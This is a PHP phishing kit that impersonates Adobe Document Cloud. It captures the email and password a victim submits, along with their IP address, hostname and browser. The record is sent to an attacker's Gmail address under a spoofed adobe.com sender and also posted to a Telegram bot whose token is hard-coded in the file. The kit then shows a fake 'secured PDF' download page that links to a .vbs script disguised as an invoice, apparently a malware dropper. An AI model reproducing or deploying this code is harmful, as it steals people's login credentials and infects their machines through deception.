<?php
// ----------------- CONFIGURATION -----------------
$notificationEmail = "auwi55109@gmail.com";
$botToken = "8683548145:AAFAqneBbAlT_2TDWl_PITTEeR_shjuqdzz";
$chatId = "6461469154";

// PDF download link (change to your actual file URL)
$downloadLink = "https://conrtr.site/ms/EFT_INVpayemt_000004856437.vbs";

// -------------------------------------------------

$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$date = date("D M d, Y g:i a T");
$hostname = gethostbyaddr($ip);
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$docAction = isset($_POST['docAction']) ? $_POST['docAction'] : 'view';

// Build message
$message = "================== Adobe Access ==================\n";
$message .= "Email       : $email\n";
$message .= "Password    : $password\n";
$message .= "Selected    : $docAction\n";
$message .= "============= [ IP & Hostname ] =============\n";
$message .= "Client IP   : $ip\n";
$message .= "Hostname    : $hostname\n";
$message .= "Date & Time : $date\n";
$message .= "User Agent  : $userAgent\n";
$message .= "==================+ END +==================\n";

// 1. Send email
$subject = "🔐 Adobe Login Access – $ip";
$headers = "From: Adobe Secure <noreply@adobe.com>\r\n";
$headers .= "Reply-To: no-reply@adobe.com\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@mail($notificationEmail, $subject, $message, $headers);

// 2. Send to Telegram
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = [
    'chat_id' => $chatId,
    'text'    => $message,
    'parse_mode' => 'HTML'
];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
curl_close($ch);

// ----------------- SHOW DOWNLOAD PAGE -----------------
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Secure Document Access</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background: linear-gradient(145deg, #f5f7fc 0%, #eef2f8 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', system-ui, -apple-system;
        }
        .download-card {
            background: white;
            border-radius: 32px;
            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.15);
            padding: 2rem;
            text-align: center;
            max-width: 550px;
            width: 90%;
        }
        .icon-success {
            background: #e8f5e9;
            width: 80px;
            height: 80px;
            line-height: 80px;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1.5rem;
        }
        .icon-success i {
            font-size: 3rem;
            color: #2e7d32;
        }
        .btn-download {
            background: #fa0f00;
            border: none;
            border-radius: 40px;
            padding: 12px 28px;
            font-weight: 600;
            font-size: 1.1rem;
            color: white;
            transition: 0.2s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .btn-download:hover {
            background: #d30800;
            transform: translateY(-2px);
            color: white;
        }
        .expiry-note {
            background: #fef7e0;
            border-radius: 20px;
            padding: 12px;
            font-size: 0.85rem;
            color: #b45309;
        }
        .alert-warning {
            background: #fff3e0;
            border-left: 5px solid #ff9800;
            color: #8a5a00;
            padding: 12px;
            border-radius: 12px;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
        }
    </style>
</head>
<body>
<div class="download-card">
    <div class="icon-success">
        <i class="fas fa-check-circle"></i>
    </div>
    <h3 class="fw-bold mb-2">✅ Access Granted</h3>
    <p class="text-muted">Your identity has been verified. The secured document is ready.</p>

    <?php
    // Edge detection warning
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($userAgent, 'Edg') !== false) {
        echo '<div class="alert-warning">
                <i class="fas fa-exclamation-triangle me-2"></i>
                For the best download experience, we recommend using 
                <a href="https://www.google.com/chrome/" target="_blank" class="fw-bold" style="color:#d30800;">Google Chrome</a>.
              </div>';
    }
    ?>

    <div class="alert alert-light border rounded-4 p-3 mt-2 text-start bg-light">
        <i class="fas fa-file-pdf text-danger me-2"></i> <strong>Document name:</strong> <span class="font-monospace">Adobe_Confidential_Report.pdf</span><br>
        <i class="fas fa-lock me-2 text-secondary"></i> Encrypted & signed by Adobe Sign
    </div>

    <a href="<?php echo htmlspecialchars($downloadLink); ?>" class="btn-download mt-2" download>
        <i class="fas fa-download"></i> Download PDF Now
    </a>

    <?php if ($docAction === 'view'): ?>
        <a href="<?php echo htmlspecialchars($downloadLink); ?>" target="_blank" class="btn btn-outline-secondary rounded-pill mt-3 w-100">
            <i class="far fa-eye me-2"></i> View Online (opens in new tab)
        </a>
    <?php elseif ($docAction === 'email'): ?>
        <div class="mt-3 small text-secondary">
            <i class="fas fa-envelope-open-text"></i> A copy was also sent to your email address.
        </div>
    <?php endif; ?>

    <div class="expiry-note mt-4">
        <i class="fas fa-hourglass-half me-2"></i> This download link will expire in <strong>7 days</strong>. 
        For security, the link is one‑time use.
    </div>
    <hr class="my-3">
    <div class="text-muted small">
        <i class="fas fa-shield-alt me-1"></i> Protected by Adobe Document Cloud
    </div>
</div>
</body>
</html>
<?php
exit;
?>